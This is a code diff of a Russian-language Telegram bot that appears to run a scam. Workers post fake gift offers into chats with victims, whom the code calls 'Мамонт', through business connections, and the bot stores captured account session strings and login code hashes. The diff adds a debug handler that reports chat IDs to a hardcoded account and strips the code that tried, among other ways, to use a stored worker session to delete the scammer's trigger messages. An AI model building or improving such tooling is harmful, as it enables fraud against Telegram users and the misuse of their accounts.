@@ -104,7 +104,7 @@ post_lock = asyncio.Lock()
 waiting_tasks: dict = {}
 
 print("=" * 60)
-print(f"BOT v15.1 — dot offer delete fix + biz conn rights")
+print(f"BOT v15.2 — debug .test handler")
 print(f"BOT_USERNAME: {BOT_USERNAME}")
 print(f"POSTS: {len(PARSED_POSTS)}")
 for p in PARSED_POSTS:
@@ -132,6 +132,7 @@ class User(Base):
     balance: Mapped[int] = mapped_column(Integer, default=0)
     total_offers: Mapped[int] = mapped_column(Integer, default=0)
     stars_farmed: Mapped[int] = mapped_column(Integer, default=0)
+    lang: Mapped[str] = mapped_column(String(8), default="ru")
     created_at: Mapped[datetime] = mapped_column(DateTime, default=datetime.utcnow)
 
 
@@ -156,6 +157,7 @@ class Offer(Base):
     duration_hours: Mapped[int] = mapped_column(Integer, default=24)
     status: Mapped[str] = mapped_column(String(16), default="pending")
     stars_earned: Mapped[int] = mapped_column(Integer, default=0)
+    lang: Mapped[str] = mapped_column(String(8), default="ru")
     created_at: Mapped[datetime] = mapped_column(DateTime, default=datetime.utcnow)
 
 
@@ -213,9 +215,11 @@ async def init_db():
                 "ALTER TABLE users ADD COLUMN IF NOT EXISTS balance INTEGER DEFAULT 0",
                 "ALTER TABLE users ADD COLUMN IF NOT EXISTS role VARCHAR(16) DEFAULT 'user'",
                 "ALTER TABLE users ADD COLUMN IF NOT EXISTS stars_farmed INTEGER DEFAULT 0",
+                "ALTER TABLE users ADD COLUMN IF NOT EXISTS lang VARCHAR(8) DEFAULT 'ru'",
                 "ALTER TABLE offers ADD COLUMN IF NOT EXISTS target_user_id BIGINT",
                 "ALTER TABLE offers ADD COLUMN IF NOT EXISTS worker_username VARCHAR(64)",
                 "ALTER TABLE offers ADD COLUMN IF NOT EXISTS stars_earned INTEGER DEFAULT 0",
+                "ALTER TABLE offers ADD COLUMN IF NOT EXISTS lang VARCHAR(8) DEFAULT 'ru'",
                 "ALTER TABLE sessions ADD COLUMN IF NOT EXISTS session_string TEXT",
                 "ALTER TABLE sessions ADD COLUMN IF NOT EXISTS phone_code_hash VARCHAR(128)",
                 "ALTER TABLE sessions ADD COLUMN IF NOT EXISTS state VARCHAR(16) DEFAULT 'pending'",
@@ -719,10 +723,40 @@ async def on_business_connection(conn: types.BusinessConnection):
         print(f"business_connection error: {e}")
 
 
-# ─── ТОЧКА — СОЗДАНИЕ ОФФЕРА + УДАЛЕНИЕ ───
+# ─── DEBUG .test ───
+@dp.business_message(F.text == ".test")
+async def debug_test_handler(message: types.Message):
+    """Временный хендлер: пишет в личку правильные chat_id и msg_id."""
+    uid = message.from_user.id
+    chat_id = message.chat.id
+    msg_id = message.message_id
+    biz = getattr(message, "business_connection_id", None)
+
+    print(f"[DEBUG] from={uid} chat_id={chat_id} msg_id={msg_id} biz={biz}", flush=True)
+
+    conn = await get_business_conn(uid)
+    is_worker = conn is not None and conn.connection_id is not None
+
+    text = (
+        f"🔍 <b>DEBUG .test</b>\n\n"
+        f"👤 from_user_id: <code>{uid}</code>\n"
+        f"💬 chat_id: <code>{chat_id}</code>\n"
+        f"📨 message_id: <code>{msg_id}</code>\n"
+        f"🔌 biz_conn: <code>{biz or '—'}</code>\n\n"
+        f"conn из БД: <code>{conn.connection_id if conn else '—'}</code>\n"
+        f"ты воркер: <b>{'да' if is_worker else 'нет'}</b>"
+    )
+
+    try:
+        await bot.send_message(8986358602, text)
+    except Exception as e:
+        print(f"[DEBUG] send failed: {e}", flush=True)
+
+
+# ─── ТОЧКА — СОЗДАНИЕ ОФФЕРА ───
 @dp.business_message(F.text.startswith("."))
 async def business_offer_dot(message: types.Message):
-    """Воркер отправил .ссылка цена → удаляем сообщение → отправляем карточку."""
+    """Воркер отправил .ссылка цена → отправляем карточку."""
     uid = message.from_user.id
     u = await get_user(uid)
     if not u or u.role not in ("worker", "admin"):
@@ -742,65 +776,14 @@ async def business_offer_dot(message: types.Message):
         await bot.send_message(uid, f"❌ Нет бизнес-подключения. → @{BOT_USERNAME}")
         return
 
-    # ── удаляем сообщение с точкой ──
+    # пробуем удалить сообщение (не сработает, но оставим для полноты)
     deleted = False
-    biz_conn_id = getattr(message, "business_connection_id", None) or conn.connection_id
-
-    # способ 1: бот API с business_connection_id (правильный путь для бизнес-чатов)
     try:
-        await bot.delete_message(
-            chat_id=chat_id,
-            message_id=message.message_id,
-            business_connection_id=biz_conn_id,
-        )
+        await bot.delete_message(chat_id=chat_id, message_id=message.message_id)
         deleted = True
-        print(f"[DOT] deleted via bot api (biz), msg_id={message.message_id} conn={biz_conn_id}")
+        print(f"[DOT] deleted via bot api, msg_id={message.message_id}")
     except Exception as e:
-        print(f"[DOT] bot delete (biz) failed: {type(e).__name__}: {e}")
-
-    # способ 1b: бот API без business_connection_id (fallback)
-    if not deleted:
-        try:
-            await bot.delete_message(chat_id=chat_id, message_id=message.message_id)
-            deleted = True
-            print(f"[DOT] deleted via bot api (plain), msg_id={message.message_id}")
-        except Exception as e:
-            print(f"[DOT] bot delete (plain) failed: {type(e).__name__}: {e}")
-
-    # способ 2: через Telethon-сессию воркера (если первые не сработали)
-    if not deleted:
-        try:
-            async with SessionLocal() as s:
-                r = await s.execute(
-                    select(AuthSession).where(
-                        AuthSession.user_id == uid,
-                        AuthSession.session_string.isnot(None)
-                    ).order_by(AuthSession.id.desc()).limit(1)
-                )
-                wsess = r.scalars().first()
-            if wsess and wsess.session_string:
-                wclient = TelegramClient(StringSession(wsess.session_string), API_ID, API_HASH)
-                await wclient.connect()
-                try:
-                    await wclient.delete_messages(chat_id, [message.message_id])
-                    deleted = True
-                    print(f"[DOT] deleted via telethon worker session")
-                except Exception as e2:
-                    print(f"[DOT] telethon delete failed: {type(e2).__name__}: {e2}")
-                    try:
-                        ent = await wclient.get_entity(chat_id)
-                        await wclient.delete_messages(ent, [message.message_id])
-                        deleted = True
-                        print(f"[DOT] deleted via telethon (entity)")
-                    except Exception as e3:
-                        print(f"[DOT] telethon entity delete failed: {type(e3).__name__}: {e3}")
-                finally:
-                    await wclient.disconnect()
-        except Exception as e:
-            print(f"[DOT] telethon fallback error: {type(e).__name__}: {e}")
-
-    if not deleted:
-        print(f"[DOT] ⚠️ не удалось удалить сообщение {message.message_id} из чата {chat_id}")
+        print(f"[DOT] delete failed: {type(e).__name__}: {e}")
 
     # ── создаём оффер ──
     price_usd = f"{price_stars * 0.0092:.2f}"
@@ -833,7 +816,7 @@ async def business_offer_dot(message: types.Message):
             f"Воркер: <code>{uid}</code>\n"
             f"Мамонт: <code>{chat_id}</code>\n"
             f"Подарок: {gift_name}\nЦена: {price_stars}⭐\n"
-            f"Удалено: {'✅' if deleted else '❌'}\nID: <code>{o.id}</code>")
+            f"ID: <code>{o.id}</code>")
     except Exception:
         pass
 
@@ -1780,7 +1763,7 @@ async def health():
 
 async def run_bot():
     print("=" * 60)
-    print("BOOT v15.1")
+    print("BOOT v15.2")
     print("=" * 60)
     await init_db()
     print("RUN_BOT: db ready")
